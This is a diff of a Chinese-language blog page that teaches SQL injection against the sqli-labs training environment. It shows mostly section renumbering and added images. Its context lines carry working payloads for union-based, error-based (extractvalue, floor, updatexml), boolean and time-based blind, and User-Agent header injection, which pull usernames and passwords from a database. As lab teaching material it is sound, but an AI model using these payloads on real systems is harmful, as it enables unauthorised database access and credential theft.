@@ -23,10 +23,12 @@
 <meta property="og:site_name" content="kaikaikai&#39;s blog">
 <meta property="og:description" content="0. SQL注入漏洞 0.1 漏洞原理 未经充分验证和过滤的用户输入数据被直接拼接到SQL查询中，导致攻击者能够插入恶意SQL代码执行未经授权的数据库操作。 0.2 分类 0.2.1 按注入点类型分类 0.2.1.1 数字型注入 原理： 输入的参数为整数，如ID、年龄、页码等，如果存在注入型漏洞，则为数字型 (整型）注入。 例：http:&#x2F;www.testweb.com&#x2F;user.">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/01/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5.assets/202311011911741.png">
 <meta property="article:published_time" content="2023-11-01T08:02:18.000Z">
-<meta property="article:modified_time" content="2023-11-07T10:03:55.676Z">
+<meta property="article:modified_time" content="2023-11-22T07:07:14.723Z">
 <meta property="article:author" content="kaikaikai">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/11/01/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5.assets/202311011911741.png">
   
   
   
@@ -207,7 +209,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          11k 字
+          12k 字
         
       </span>
     
@@ -218,7 +220,7 @@
         
         
         
-          96 分钟
+          99 分钟
         
       </span>
     
@@ -335,11 +337,24 @@
 <li>堆查询注入：同时执行多条语句的注入</li>
 </ul>
 <h2 id="sql基础">0.3 SQL基础</h2>
-<p>常用注释符：</p>
+<p><strong>常用注释符：</strong></p>
 <ul>
-<li><p><code>#</code></p></li>
-<li><p><code>--</code></p></li>
+<li><code>#</code></li>
+<li><code>--</code></li>
 </ul>
+<p><strong>information_schema数据库（MySQL5.5以上自带）:</strong></p>
+<figure>
+<img src="SQL注入.assets/202311011911741.png" srcset="/img/loading.gif" lazyload
+alt="image-20231101161612604" />
+<figcaption aria-hidden="true">image-20231101161612604</figcaption>
+</figure>
+<p><strong>各数据库在字符串处理时的区别：</strong></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221455568.png" srcset="/img/loading.gif" lazyload
+alt="image-20231122145512407" />
+<figcaption aria-hidden="true">image-20231122145512407</figcaption>
+</figure>
 <h2 id="基本注入流程">0.4 基本注入流程</h2>
 <ol type="1">
 <li>判断是否存在注入点;</li>
@@ -352,23 +367,18 @@
 <li>猜解账号密码;</li>
 <li>登录管理员后台。</li>
 </ol>
-<h1 id="基于联合查询的数字型get注入">1. 基于联合查询的数字型GET注入</h1>
-<h2 id="原理">1.1 原理</h2>
+<h1 id="基于联合查询的注入">1. 基于联合查询的注入</h1>
+<h2 id="基于联合查询的数字型get注入">1.1
+基于联合查询的数字型GET注入</h2>
+<h3 id="原理">1.1.1 原理</h3>
 <p>数字型GET注入，其注入点存在于URL中的GET参数处，如<code>http://www.testweb.com/user.php?id=8</code>，而服务器后端实际查询代码原型诸如：<code>select … from … where id=$id…</code>。攻击者可以通过构造恶意的GET输入参数，利用union
 select命令进行注入，暴露数据库中存储的信息。</p>
-<p><strong>information_schema数据库:</strong></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311011911741.png" srcset="/img/loading.gif" lazyload
-alt="image-20231101161612604" />
-<figcaption aria-hidden="true">image-20231101161612604</figcaption>
-</figure>
-<h2 id="注入过程">1.2 注入过程</h2>
+<h3 id="注入过程">1.2.1 注入过程</h3>
 <ol type="1">
 <li><p>寻找注入点，判断注入类型</p></li>
 <li><p>获取网站查询的字段数（关键字order by）</p>
 <blockquote>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;//--+作用：注释掉后面语句（也可用编码后的#，为%23）<br>&gt;<span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 order by 3--+<br></code></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//--+作用：注释掉后面语句（也可用编码后的#，为%23）</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 order by 3--+<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 <li><p>判断网站的回显位置</p>
 <blockquote>
@@ -391,11 +401,12 @@ alt="image-20231101161612604" />
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1--+<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 </ol>
-<h1 id="基于联合查询的字符型get注入">2. 基于联合查询的字符型GET注入</h1>
-<h2 id="原理-1">2.1 原理</h2>
+<h2 id="基于联合查询的字符型get注入">1.2
+基于联合查询的字符型GET注入</h2>
+<h3 id="原理-1">1.2.1 原理</h3>
 <p>字符型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=admin，而服务器后端实际查询代码原型诸如：<code>select … from … where id=’$id’…</code>。攻击者可以通过构造恶意的GET输入参数，利用union
 select命令进行注入，暴露数据库中存储的信息。<strong>与数字型注入的区别在于:字符型注入一般需要单引号来闭合.</strong></p>
-<h2 id="注入过程-1">2.2 注入过程</h2>
+<h3 id="注入过程-1">1.2.2 注入过程</h3>
 <ol type="1">
 <li><p>寻找注入点，判断注入类型</p></li>
 <li><p>获取网站查询的字段数（关键字order by）</p>
@@ -423,14 +434,14 @@ select命令进行注入，暴露数据库中存储的信息。<strong>与数字
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1--+<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 </ol>
-<h1 id="基于联合查询的post注入">3. 基于联合查询的POST注入</h1>
-<h2 id="post注入原理">3.1 POST注入原理</h2>
+<h2 id="基于联合查询的post注入">1.3 基于联合查询的POST注入</h2>
+<h3 id="post注入原理">1.3.1 POST注入原理</h3>
 <p>POST注入，其注入点存在于POST表单中的参数处。攻击者可以通过代理抓包工具（如Burpsuite）拦截并修改POST表单中的参数，利用union
 select命令进行注入，暴露数据库中存储的信息。</p>
-<h2 id="注入流程">3.2 注入流程</h2>
-<p>实例:sqli-labs/Less-11(同GET型)</p>
-<h1 id="基于报错的注入">4. 基于报错的注入</h1>
-<h2 id="概述">4.1 概述</h2>
+<h3 id="注入流程">1.3.2 注入流程</h3>
+<p>实例：sqli-labs/Less-11</p>
+<h1 id="基于报错的注入">2. 基于报错的注入</h1>
+<h2 id="概述">2.1 概述</h2>
 <ul>
 <li><p>基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。</p></li>
 <li><p>报错注入一般需要具备两个前提条件：</p>
@@ -439,8 +450,8 @@ select命令进行注入，暴露数据库中存储的信息。</p>
 <li><p>后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。</p></li>
 </ul></li>
 </ul>
-<h2 id="extractvalue函数">4.2 extractvalue()函数</h2>
-<h3 id="原理-2">4.2.1 原理</h3>
+<h2 id="extractvalue函数">2.2 extractvalue()函数</h2>
+<h3 id="原理-2">2.2.1 原理</h3>
 <ul>
 <li>作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。</li>
 <li>语法：<code>extractvalue(XML_document, XPath_string)</code>
@@ -454,7 +465,7 @@ select命令进行注入，暴露数据库中存储的信息。</p>
 函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示。</li>
 <li>实例:<code>select extractvalue(1,concat('~',user()))</code>——主要是构造concat</li>
 </ul>
-<h3 id="注入流程-1">4.2.2 注入流程</h3>
+<h3 id="注入流程-1">2.2.2 注入流程</h3>
 <ol type="1">
 <li><p>寻找注入点,判断注入类型(本例为字符型注入)</p></li>
 <li><p>获取网站当前所在数据库的库名</p>
@@ -474,8 +485,8 @@ select命令进行注入，暴露数据库中存储的信息。</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//显示第1组数据</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1))<br>)--+<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 </ol>
-<h2 id="floor函数">4.3 floor()函数</h2>
-<h3 id="原理-3">4.3.1 原理</h3>
+<h2 id="floor函数">2.3 floor()函数</h2>
+<h3 id="原理-3">2.3.1 原理</h3>
 <ul>
 <li>在进行报错注入时，floor()函数一般需要与rand()、count()、group
 by联用。</li>
@@ -490,9 +501,9 @@ by联用。</li>
 by、rand()联用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由group
 by将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如：Duplicate
 entry ‘…’ for key 'group_key’。</li>
-<li>实例:<code>select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a</code>——主要是构造concat</li>
+<li>实例:<code>select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a</code>——主要是构造concat</li>
 </ul>
-<h3 id="注入流程-2">4.3.2 注入流程</h3>
+<h3 id="注入流程-2">2.3.2 注入流程</h3>
 <ol type="1">
 <li><p>寻找注入点,判断注入类型（本例为字符型注入）</p></li>
 <li><p>获取网站当前所在数据库的库名</p>
@@ -512,19 +523,27 @@ entry ‘…’ for key 'group_key’。</li>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//显示第1组数据<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 </ol>
-<h2 id="其他函数">4.4 其他函数</h2>
-<h3 id="updatexml">4.4.1 updatexml()</h3>
+<h2 id="其他函数">2.4 其他函数</h2>
+<h3 id="updatexml">2.4.1 updatexml()</h3>
 <p>实例:<code>select updatexml(1,concat('~',user()),1)</code></p>
-<h3 id="exp">4.4.2 exp()</h3>
+<h3 id="exp">2.4.2 exp()</h3>
 <p>实例:<code>select exp(~(select * from (select user()) as x))</code></p>
-<h1 id="sql盲注">5. SQL盲注</h1>
-<h2 id="基于布尔的盲注">5.1 基于布尔的盲注</h2>
-<h3 id="原理-4">5.1.1 原理</h3>
+<h3 id="mysql数据库报错功能函数汇总">2.4.3
+MySQL数据库报错功能函数汇总</h3>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221446385.png" srcset="/img/loading.gif" lazyload
+alt="image-20231122144647534" />
+<figcaption aria-hidden="true">image-20231122144647534</figcaption>
+</figure>
+<h1 id="sql盲注">3. SQL盲注</h1>
+<h2 id="基于布尔的盲注">3.1 基于布尔的盲注</h2>
+<h3 id="原理-4">3.1.1 原理</h3>
 <p>某些场合下，页面返回的结果只有<strong>两种（正常或错误）</strong>。通过构造SQL判断语句，查看页面的返回结果（True
 or False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。</p>
-<h3 id="注入流程-3">5.1.2 注入流程</h3>
+<h3 id="注入流程-3">3.1.2 注入流程</h3>
 <ol type="1">
-<li><p>寻找注入点,判断注入类型</p></li>
+<li><p>寻找注入点,判断注入类型（本例为字符型注入）</p></li>
 <li><p>盲猜网站当前所在数据库的库名长度</p>
 <blockquote>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句length(database())=M，不断变化M的值去猜测，如果M不等于N，页面应该</span><br><span class="hljs-comment">//显示为False；如果M等于N，页面应该显示为True。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and length(database())=7--+<br></code></pre></td></tr></table></figure>
@@ -546,15 +565,15 @@ or False）来判断哪些SQL判断条件成立，通过此来获取数据库中
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>组数据的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;</span>D<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 </blockquote></li>
 </ol>
-<h2 id="基于时间的盲注">5.2 基于时间的盲注</h2>
-<h3 id="原理-5">5.2.1 原理</h3>
+<h2 id="基于时间的盲注">3.2 基于时间的盲注</h2>
+<h3 id="原理-5">3.2.1 原理</h3>
 <p>某些场合下，页面只有<strong>一种</strong>返回结果，使用具有延时功能的函数sleep()、benchmark()等，通过判断这些函数是否正常执行来获取数据库中的数据。</p>
-<h3 id="注入流程-4">5.2.3 注入流程</h3>
+<h3 id="注入流程-4">3.2.3 注入流程</h3>
 <ol type="1">
 <li><p>寻找注入点,判断注入类型</p></li>
 <li><p>盲猜网站当前所在数据库的库名长度</p>
 <blockquote>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句if((length(database())=M),sleep(5),1)，不断变化M的值去猜测，如果M等于N，此时sleep(5)会成功执行，页面应该会有明显延迟。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+<br></code></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句if((length(database())=M),sleep(5),1)，不断变化M的值去猜测，如果M等于N，此时sleep(5)会成功执行，页面应该会有明显延迟。</span><br><span class="hljs-comment">//语法格式: if(expr,expr2,expr3)expr1为true则返回expr2，expr1为false则返回expr3。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 <li><p>盲猜网站当前所在数据库的库名字符串</p>
 <blockquote>
@@ -573,8 +592,8 @@ or False）来判断哪些SQL判断条件成立，通过此来获取数据库中
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>组数据的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;</span>D<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 </blockquote></li>
 </ol>
-<h1 id="http头部注入">6. HTTP头部注入</h1>
-<h2 id="原理-6">6.1 原理</h2>
+<h1 id="http头部注入">4. HTTP头部注入</h1>
+<h2 id="原理-6">4.1 原理</h2>
 <ul>
 <li><p>有时候，后台开发人员为了验证客户端HTTP
 Header（比如常用的Cookie验证等）或者通过HTTP
@@ -584,12 +603,12 @@ Header的注入漏洞。</p></li>
 <li><p>常见的HTTP
 Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等(注入位置)。</p></li>
 </ul>
-<h2 id="注入流程-5">6.2 注入流程</h2>
+<h2 id="注入流程-5">4.2 注入流程</h2>
 <ol type="1">
 <li><p>寻找注入点,判断注入类型（字符 or 数字）</p></li>
 <li><p>获取网站当前所在数据库的库名（使用基于报错的注入方法）</p>
 <blockquote>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>sqli-labs Less-<span class="hljs-number">18</span><br>User-Agent:Mozilla<span class="hljs-regexp">/5.0......Firefox/</span><span class="hljs-number">46.0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,database())),&#x27;</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">//sqli-labs Less-<span class="hljs-number">18</span><br>//$insert=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-title">User-Agent:</span>Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0</span>&#x27; <span class="hljs-literal">and</span> extractvalue(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,database())),&#x27;&#x27;,&#x27;&#x27;)#<br></code></pre></td></tr></table></figure>
 </blockquote></li>
 <li><p>获取数据库security的全部表名</p>
 <blockquote>
